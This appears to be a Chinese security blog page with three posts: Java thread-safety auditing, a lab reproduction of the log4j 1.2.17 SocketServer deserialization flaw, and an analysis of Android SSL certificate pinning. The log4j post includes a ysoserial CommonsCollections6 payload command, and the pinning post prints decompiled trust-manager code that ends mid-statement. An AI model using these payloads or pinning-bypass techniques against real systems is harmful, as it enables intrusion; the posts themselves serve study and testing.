<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>beautiful test</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  <meta property="og:type" content="website">
<meta property="og:title" content="beautiful test">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="beautiful test">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="beautiful test">
  
    <link rel="alternate" href="/atom.xml" title="beautiful test" type="application/atom+xml">
  
  
    <link rel="icon" href="/images/default-avatar.jpg">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/highlight.css">
  <script>
  let antiquityStorage = window.sessionStorage.getItem('antiquitySessionStorage');
  if (antiquityStorage == '' || antiquityStorage == null) {
    var antiquityLoader = '<div id="loaderbox"><div class="loader"><div class="load-roll"><div class="load-top"></div><div class="load-right"></div><div class="load-bottom"></div></div></div></div>';
    document.write(antiquityLoader);
    document.body.style.overflow = 'hidden'
  }
  </script>
</head>
</html>
<body>
  <div id="fullpage" class="mobile-nav-right">
    
      <div id="wrapper" style="background-image: url(/images/test.jpg)" title="为了更安全的互联网">
    
    
      <header id="header">
  <div id="nav-toggle" class="nav-toggle"></div>
  <div class="head-box global-width">
    <nav class="nav-box nav-right">
      
        <a class="nav-item" href="/" title
        
        >首页</a>
      
        <a class="nav-item" href="/archives" title
        
        >归档</a>
      
    </nav>
  </div>
</header>
      <div id="middlecontent" title class="global-width sidebar-right">
        <section id="main">
  
    <article id="post-深入剖析代审的线程安全问题" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/12/深入剖析代审的线程安全问题/">深入剖析代审的线程安全问题</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2020/01/12/深入剖析代审的线程安全问题/" class="article-date">
  <time datetime="2020-01-11T16:14:10.000Z" itemprop="datePublished">2020-01-12</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>作者：Runtest</strong><br>最近对JAVA代码安全的学习越来越感兴趣，今天就来聊一聊线程安全,想学习线程安全，就看看哪些情况不安全，写代码来验证那些比较抽象的东西来增加对代码的理解和学习。</p>
<h3 id="0x01-非局部变量和方法参数"><a href="#0x01-非局部变量和方法参数" class="headerlink" title="0x01 非局部变量和方法参数"></a>0x01 非局部变量和方法参数</h3><p>方法传递的参数也相当于局部，局部变量在线程栈中存放，调用地址为随机地址，共享变量在方法区，堆空间<br>code</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Threadtypesec implements Runnable&#123;</span><br><span class="line">    private volatile int count = 5;</span><br><span class="line">    @Override</span><br><span class="line">    public  void run() &#123;</span><br><span class="line">//synchronized</span><br><span class="line">//        int count = 5;</span><br><span class="line">        count=count-1;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+&quot;当前值为&quot;+count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>创建多个线程，执行run方法。</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Runnable runnable = new Threadtypesec();</span><br><span class="line">Thread[] threads1 = new Thread[5];</span><br><span class="line">for (int i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    threads1[i] = new Thread(runnable,&quot;当前线程&quot;+(i+1));</span><br><span class="line">&#125;</span><br><span class="line">for(Thread thread1 : threads1) &#123;</span><br><span class="line">    thread1.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果如下，多线程操作类里面的公共变量导致操作值未能及时更新减一，猜测那些条件竞争漏洞也是基础此类的原理</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">当前线程2当前值为3</span><br><span class="line">当前线程3当前值为2</span><br><span class="line">当前线程1当前值为3</span><br><span class="line">当前线程5当前值为0</span><br><span class="line">当前线程4当前值为1</span><br></pre></td></tr></table></figure></div>

<h3 id="0x02-安全的写法"><a href="#0x02-安全的写法" class="headerlink" title="0x02 安全的写法"></a>0x02 安全的写法</h3><p>实现安全的方法不止一种</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Threadtypesec implements Runnable&#123;</span><br><span class="line">    private volatile int count = 5;</span><br><span class="line">    @Override</span><br><span class="line">    public synchronized void run() &#123;</span><br><span class="line">//synchronized</span><br><span class="line">//        int count = 5;</span><br><span class="line">        count=count-1;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+&quot;当前值为&quot;+count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>用synchronized修饰方法，即为同步的方法或者和区，多线程执行同一方法下，单个线程会先获取方法区的锁，执行完后释放锁，整个过程属于JVM管理，这里要区别synchronized和ReentrantLock的实现原理，略有不同，参考：<a href="https://www.cnblogs.com/revel171226/p/9411131.html" target="_blank" rel="noopener">https://www.cnblogs.com/revel171226/p/9411131.html</a></p>
<h3 id="0x03-单例模式下线程安全"><a href="#0x03-单例模式下线程安全" class="headerlink" title="0x03 单例模式下线程安全"></a>0x03 单例模式下线程安全</h3><p>参考：<a href="https://www.jianshu.com/p/3bfd916f2bb2" target="_blank" rel="noopener">https://www.jianshu.com/p/3bfd916f2bb2</a><br>不安全的写法：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Singlesec &#123;</span><br><span class="line">    private static Singlesec instance;</span><br><span class="line">    private Singlesec ()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static Singlesec getSinglesec() &#123;</span><br><span class="line">        if (instance == null) &#123;</span><br><span class="line">            instance = new Singlesec();</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2020/01/11/yuxBFGDEpd4I21t.png" alt="图片.png"><br>单例模式：在程序运行过程中保证仅有一个对象被创建，以下代码进行了是双重校验，volatile变量保证了singleton的内存可见性以及防止指令重排序，synchronized原语确保创建安全</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Singlesec &#123;</span><br><span class="line">    private volatile static Singlesec instance;</span><br><span class="line">    private Singlesec ()&#123;&#125;</span><br><span class="line">    public static Singlesec getSinglesec() &#123;</span><br><span class="line">        if (instance == null) &#123;</span><br><span class="line">            synchronized (Singlesec.class) &#123;</span><br><span class="line">                if (instance == null) &#123;</span><br><span class="line">                    instance = new Singlesec();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>验证<br><img src="https://i.loli.net/2020/01/11/cTXs7aKzyAW5LZj.png" alt="图片.png"><br>使用下面这种方法，在类被加载的时候创建实例,所以线程是安全的</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Singlesec &#123;</span><br><span class="line">    private static Singlesec instance = new Singlesec();</span><br><span class="line">    private Singlesec ()&#123;&#125;</span><br><span class="line">    public static Singlesec getInstance() &#123;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2020/01/12/pLQehDk1VzvsgAH.png" alt="图片.png"><br>至于构造方法为什么被私有化，是为了防止其他class创建<br><img src="https://i.loli.net/2020/01/11/m75KSwjzI9MQlXD.png" alt="图片.png"></p>
<h3 id="0x03-Spring中单例模式安全问题"><a href="#0x03-Spring中单例模式安全问题" class="headerlink" title="0x03 Spring中单例模式安全问题"></a>0x03 Spring中单例模式安全问题</h3><p>为什么要说spring系列的框架呢，因为我遇到最多的代码使用的基本都是Spring系列的，spring中线程安全性依赖于ThreadLocal，ThreadLocal可以理解为synchronized类似的基于JVM实现的线程安全函数，只不过ThreadLocal实现类似于hashmap。<br>强力推荐读这篇文章<a href="https://www.jianshu.com/p/e200e96a41a0" target="_blank" rel="noopener">https://www.jianshu.com/p/e200e96a41a0</a></p>
<h3 id="晚安了"><a href="#晚安了" class="headerlink" title="晚安了"></a>晚安了</h3><p>夜已深，改天详细写Spring中一些列的场景的安全问题。</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-关于最近的log4j的漏洞复现及分析" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/05/关于最近的log4j的漏洞复现及分析/">关于最近log4j的漏洞复现及分析</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2020/01/05/关于最近的log4j的漏洞复现及分析/" class="article-date">
  <time datetime="2020-01-05T11:04:45.000Z" itemprop="datePublished">2020-01-05</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h3 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h3><p>环境 JDK1.8 mac  maven3.6 log4j1.2.17  commons-collections3.1<br>maven 配置如下：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">  &lt;groupId&gt;runtest&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;runtest&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">  &lt;packaging&gt;war&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">  &lt;name&gt;runtest Maven Webapp&lt;/name&gt;</span><br><span class="line">  &lt;!-- FIXME change it to the project&apos;s website --&gt;</span><br><span class="line">  &lt;url&gt;http://www.example.com&lt;/url&gt;</span><br><span class="line"></span><br><span class="line">  &lt;properties&gt;</span><br><span class="line">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;</span><br><span class="line">    &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;</span><br><span class="line">  &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">      &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">      &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;log4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;log4j&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.2.17&lt;/version&gt;</span><br><span class="line">      &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">  &lt;build&gt;</span><br><span class="line">    &lt;finalName&gt;runtest&lt;/finalName&gt;</span><br><span class="line">    &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span><br><span class="line">      &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        &lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.0.2&lt;/version&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.8.0&lt;/version&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;2.22.1&lt;/version&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.2.2&lt;/version&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;2.5.2&lt;/version&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;2.8.2&lt;/version&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">      &lt;/plugins&gt;</span><br><span class="line">    &lt;/pluginManagement&gt;</span><br><span class="line">  &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure></div>

<p>log4j配置文件：<br>创建配置文件目录，idea下转成datasource配置，不然idea识别不了</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># src/resources/log4j.properties</span><br><span class="line">log4j.rootCategory=DEBUG,stdout</span><br><span class="line">log4j.appender.stdout=org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.stdout.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.stdout.threshold=DEBUG</span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern=[%d&#123;yyy-MM-dd HH:mm:ss,SSS&#125;]-[%p]-[MSG!:%m]-[%c\:%L]%n</span><br></pre></td></tr></table></figure></div>

<p>开启socket端口接受反序列化的流：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import org.apache.log4j.net.SimpleSocketServer;</span><br><span class="line"></span><br><span class="line">public class Sockettest &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        System.out.println(&quot;INFO: Log4j Listening on port 8888&quot;);</span><br><span class="line">        String[] arguments = &#123;&quot;8888&quot;, (new Sockettest()).getClass().getClassLoader().getResource(&quot;log4j.properties&quot;).getPath()&#125;;//创建socket,加载配置文件</span><br><span class="line">        SimpleSocketServer.main(arguments);</span><br><span class="line">        System.out.println(&quot;INFO: Log4j output successfuly.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ojbk<br><img src="https://i.loli.net/2020/01/05/rNTvQdYgwq6yebn.png" alt="图片.png"></p>
<h4 id="poc-java-jar-ysoserial-0-0-6-SNAPSHOT-BETA-all-jar-CommonsCollections6-“open-Applications-Calculator-app”-gt-cc-bin"><a href="#poc-java-jar-ysoserial-0-0-6-SNAPSHOT-BETA-all-jar-CommonsCollections6-“open-Applications-Calculator-app”-gt-cc-bin" class="headerlink" title="poc:java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections6 “open /Applications/Calculator.app” &gt; cc.bin"></a>poc:java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections6 “open /Applications/Calculator.app” &gt; cc.bin</h4><p>此处CommonsCollections版本一定要多尝试，因为maven依赖的版本不一样，切记，切记，对应的调用链也不一样</p>
<h3 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h3><p>command跟进main方法<br><img src="https://i.loli.net/2020/01/05/kcAJ1K5PGYDdZIW.png" alt="图片.png"><br><img src="https://i.loli.net/2020/01/05/qcSXOK6ZRUrnCYx.png" alt="图片.png"><br>poc中有我们经常可见的：<br><img src="https://i.loli.net/2020/01/05/ncEgVoHqLG9CwNX.png" alt="图片.png"><br>接下来就算老生常谈的著名的CommonsCollections调用链，这里不做过多描述<br>参考：<a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a><br><a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/214096.html</a><br><a href="http://itindex.net/detail/55414-java-%E5%BA%8F%E5%88%97%E5%8C%96-%E5%B7%A5%E5%85%B7" target="_blank" rel="noopener">http://itindex.net/detail/55414-java-%E5%BA%8F%E5%88%97%E5%8C%96-%E5%B7%A5%E5%85%B7</a></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-关于安卓SSL单项校验和双向校验的思考和总结" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/04/关于安卓SSL单项校验和双向校验的思考和总结/">关于安卓SSL单项校验和双向校验的思考和总结</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2020/01/04/关于安卓SSL单项校验和双向校验的思考和总结/" class="article-date">
  <time datetime="2020-01-04T12:12:14.000Z" itemprop="datePublished">2020-01-04</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>author:RUNTest</p>
<h3 id="我为什么写这个文章"><a href="#我为什么写这个文章" class="headerlink" title="我为什么写这个文章"></a><strong>我为什么写这个文章</strong></h3><p>第一：见到过网上一些文章去描述单双向校验的绕过或者分析，但是经过和一些大佬研究后，发现网上文章或多或少存在描述错误，当然我总结也未必完全对，毕竟人的认知都需要不断刷新，涉及的东西基本上都是基于自己做实验总结的。<br>第二：开发安全不分家，学习开发对学习安全也十分重要</p>
<h3 id="0x01-什么是单向或者双向校验？"><a href="#0x01-什么是单向或者双向校验？" class="headerlink" title="0x01 什么是单向或者双向校验？"></a><strong>0x01 什么是单向或者双向校验？</strong></h3><p><strong>浏览器普通用户上网实现ssl单项校验</strong><br>普通浏览器上网过程（引用简书）：<br>定客户端叫做爱丽丝，服务器叫做鲍勃，其验证步骤为：</p>
<ul>
<li>爱丽丝(浏览器)给出协议版本号、一个客户端生成的随机数（随机数A），以及客户端支持的加密方法。</li>
<li>鲍勃（服务器）确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（随机数B）。</li>
<li>爱丽丝（浏览器）确认数字证书有效，然后生成一个新的随机数（随机数C），并使用数字证书中的公钥，加密这个随机数，发给鲍勃（服务器）。</li>
<li>鲍勃（服务器）使用自己的私钥，获取爱丽丝（浏览器）发来的随机数（随机数C）</li>
<li>爱丽丝（浏览器）和鲍勃（服务器）根据约定的加密方法，使用前面的三个随机数（A,B,C），生成”对话密钥”（session key），并使用服务器的公钥加密证书发送至服务器，用来加密接下来的整个对话过程。</li>
</ul>
<p><img src="https://i.loli.net/2020/01/04/MpyAjT6fgYX8GwK.png" alt="图片.png"></p>
<p>在第5步中，服务端返回证书，浏览器会对此进行校验，校验内容：<br>第一，检查SSL 证书是否是由浏览器中“受信任的根证书颁发机构”颁发<br>第二，检查SSL证书中的证书吊销列表<br>第三，检查此SSL证书是否过期<br>第四，检查部署此SSL证书的网站的域名是否与证书中的域名一致<br>第五，IE7浏览器会到欺诈网站数据库查询此网站是否已经被列入欺诈网站黑名单</p>
<p>如果校验通过，那么就可以继续下面的步骤，最后使用的是对称密码学加密的方式进行通信，这样做也是为了传输效率问题。<br>ps：普通用户上网实验的基本是单项校验，我们遇到自己配置的openssl生成的证书通常浏览器不可信，需要用户点击信任,因为自己配置CA不在在浏览器或者操作系统的根信任列表中，需要手动信任，不过这种情况任然是单项校验。</p>
<p><strong>移动端实现SSL单项校验过程如下图：</strong></p>
<p><img src="https://i.loli.net/2020/01/04/NVx46XzQ2RfwCBu.png" alt="图片.png"><br>  通常我们在移动端测试抓包遇到是单项的强校验。关于实现单项的强校验的代码实现可以参考先知某大佬的文章，<a href="https://www.cnblogs.com/alisecurity/p/5939336.html" target="_blank" rel="noopener">点这里</a>文章提到了实现了现TrustManger的checkServerTrusted()或者对服务器证书域名进行强校验或者真正实现HostnameVerifier的verify()亦或者是使用预埋的证书来生成TrustManger这三种方法均可以实现对服务端证书的强校验，其他还有其他方式，如校验证书哈希与本地证书哈希值是否一致等。</p>
<p><strong>移动端实现SSL双向校验的过程如下图：</strong><br><img src="https://i.loli.net/2020/01/04/s6S3TjH8Fc5eP7k.png" alt="图片.png"><br>双向校验和单项校验的最大的区别就是服务端也验证了客户端的证书，并且这个校验过程是<strong>在服务端实现</strong>的，所以个人感觉网传的hook大法绕过双向校验并非真正的双向校验，开发的同志说的话，不能百分之百的信任，还需要自己动手验证或者查阅相关文档。</p>
<h3 id="0x02-经历过绕过单项强校验的一个案例"><a href="#0x02-经历过绕过单项强校验的一个案例" class="headerlink" title="0x02 经历过绕过单项强校验的一个案例"></a>0x02 经历过绕过单项强校验的一个案例</h3><p>甲方的一个朋友，在测试的时候遇到了无法抓包的问题，并且说使用justtrust也抓不到，我将app包要了过来。值得庆幸的是，这个app没有加壳，如果加壳还需要尝试脱壳。先各种反编译。通常情况下，我遇到这种问题会先看代码怎么实现的，毕竟白盒对分析原理而言太重要了。<br>抓不到app业务数据包的截图：<br><img src="https://i.loli.net/2020/01/04/kPS28JthnybCfU7.png" alt="图片.png"><br>我将app反编译（Ps:实测mac下不推荐使用jadx，因为这样子反编译不全面）<br><img src="https://i.loli.net/2020/01/04/jBd3EzyZQ26X1Rg.png" alt="图片.png"><br>然后我个人习惯会看一下asset目录，发现了一个证书，另一个证书可能是测试环境的证书文件<br><img src="https://i.loli.net/2020/01/04/sXRhm1NSTfw5kAF.png" alt="图片.png"><br>在三个smail文件夹（对应三个dex文件），寻找校验位置<br>这里是通过搜索证书文件，因为如果这里代码实现强校验可能要用二进制流读取上面的证书文件，当然将证书硬编码也可以实现，这里不做过多的讨论<br><img src="https://i.loli.net/2020/01/04/fpATWGyaCEwkDcI.png" alt="图片.png"><br>看smail有些头疼，直接看转换的jar文件<br>这里将代码贴出：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">public class MyX509TrustManager</span><br><span class="line">  implements X509TrustManager</span><br><span class="line">&#123;</span><br><span class="line">  private Context context;</span><br><span class="line">  </span><br><span class="line">  public MyX509TrustManager(Context paramContext)</span><br><span class="line">  &#123;</span><br><span class="line">    this.context = paramContext;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString)</span><br><span class="line">    throws CertificateException</span><br><span class="line">  &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString)</span><br><span class="line">    throws CertificateException</span><br><span class="line">  &#123;</span><br><span class="line">    Object localObject1;</span><br><span class="line">    String str4;</span><br><span class="line">    String str2;</span><br><span class="line">    String str3;</span><br><span class="line">    if (paramArrayOfX509Certificate != null) &#123;</span><br><span class="line">      if (paramArrayOfX509Certificate.length &gt;= 1) &#123;</span><br><span class="line">        if ((paramString != null) &amp;&amp; (paramString.equals(&quot;ECDHE_RSA&quot;)))</span><br><span class="line">        &#123;</span><br><span class="line">          try</span><br><span class="line">          &#123;</span><br><span class="line">            localObject1 = TrustManagerFactory.getInstance(&quot;X509&quot;);</span><br><span class="line">            ((TrustManagerFactory)localObject1).init((KeyStore)null);</span><br><span class="line">            localObject1 = ((TrustManagerFactory)localObject1).getTrustManagers();</span><br><span class="line">            int j = localObject1.length;</span><br><span class="line">            int i = 0;</span><br><span class="line">            while (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">              ((X509TrustManager)localObject1[i]).checkServerTrusted(paramArrayOfX509Certificate, paramString);</span><br><span class="line">              i += 1;</span><br><span class="line">            &#125;</span><br><span class="line">            str4 = &quot;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">          catch (KeyStoreException paramString)</span><br><span class="line">          &#123;</span><br><span class="line">            paramString.printStackTrace();</span><br><span class="line">          &#125;</span><br><span class="line">          catch (NoSuchAlgorithmException paramString)</span><br><span class="line">          &#123;</span><br><span class="line">            paramString.printStackTrace();</span><br><span class="line">          &#125;</span><br><span class="line">          str2 = &quot;&quot;;</span><br><span class="line">          str3 = &quot;&quot;;</span><br><span class="line">          paramString = str2;</span><br><span class="line">          localObject1 = str4;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      try</span><br><span class="line">      &#123;</span><br><span class="line">        Object localObject3 = CertificateFactory.getInstance(&quot;X.509&quot;);</span><br><span class="line">        paramString = str2;</span><br><span class="line">        localObject1 = str4;</span><br><span class="line">        AssetManager localAssetManager = this.context.getAssets();</span><br><span class="line">        paramString = str2;</span><br><span class="line">        localObject1 = str4;</span><br><span class="line">        if (!&quot;product&quot;.equals(&quot;beta&quot;)) &#123;</span><br><span class="line">          break label406;</span><br><span class="line">        &#125;</span><br><span class="line">        String str1 = &quot;***.cer&quot;;</span><br><span class="line">        paramString = str2;</span><br><span class="line">        localObject1 = str4;</span><br><span class="line">        localObject3 = (X509Certificate)((CertificateFactory)localObject3).generateCertificate(localAssetManager.open(str1));</span><br><span class="line">        paramString = str2;</span><br><span class="line">        localObject1 = str4;</span><br><span class="line">        str1 = new BigInteger(1, ((X509Certificate)localObject3).getPublicKey().getEncoded()).toString(16);</span><br><span class="line">        paramString = str2;</span><br><span class="line">        localObject1 = str1;</span><br><span class="line">        str2 = ((X509Certificate)localObject3).getSubjectDN().getName();</span><br><span class="line">        paramString = str2;</span><br><span class="line">        localObject1 = str1;</span><br><span class="line">        str4 = ((X509Certificate)localObject3).getIssuerDN().getName();</span><br><span class="line">        paramString = str2;</span><br><span class="line">        localObject1 = str4;</span><br><span class="line">      &#125;</span><br><span class="line">      catch (IOException localIOException)</span><br><span class="line">      &#123;</span><br><span class="line">        localIOException.printStackTrace();</span><br><span class="line">        localObject2 = localObject1;</span><br><span class="line">        localObject1 = str3;</span><br><span class="line">      &#125;</span><br><span class="line">      paramArrayOfX509Certificate = paramArrayOfX509Certificate[0];</span><br><span class="line">      if (((String)localObject2).equals(new BigInteger(1, paramArrayOfX509Certificate.getPublicKey().getEncoded()).toString(16)))</span><br><span class="line">      &#123;</span><br><span class="line">        if (paramString.equals(paramArrayOfX509Certificate.getSubjectDN().getName()))</span><br><span class="line">        &#123;</span><br><span class="line">          if (((String)localObject1).equals(paramArrayOfX509Certificate.getIssuerDN().getName())) &#123;</span><br><span class="line">            return;</span><br><span class="line">          &#125;</span><br><span class="line">          throw new CertificateException(&quot;server&apos;s issuser is not equals to client&apos;s issuser&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        throw new CertificateException(&quot;server&apos;s subject is not equals to client&apos;s subject&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      throw new CertificateException(&quot;server&apos;s PublicKey is not equals to client&apos;s PublicKey&quot;);</span><br><span class="line">      throw new 